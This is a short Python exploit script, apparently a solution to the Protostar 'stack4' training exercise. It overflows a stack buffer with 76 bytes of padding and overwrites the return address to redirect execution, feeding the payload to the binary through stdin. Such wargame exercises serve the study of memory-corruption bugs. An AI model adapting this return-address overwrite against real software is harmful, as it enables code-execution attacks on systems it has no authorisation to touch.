import subprocess
import struct

program = "/opt/protostar/bin/stack4"
target = "\x08\x04\x83\xf4"[::-1]
offset = "A"*64+"abcdefghijkl"

string = offset + target
process = subprocess.Popen([program], stdin=subprocess.PIPE)
process.communicate(string)




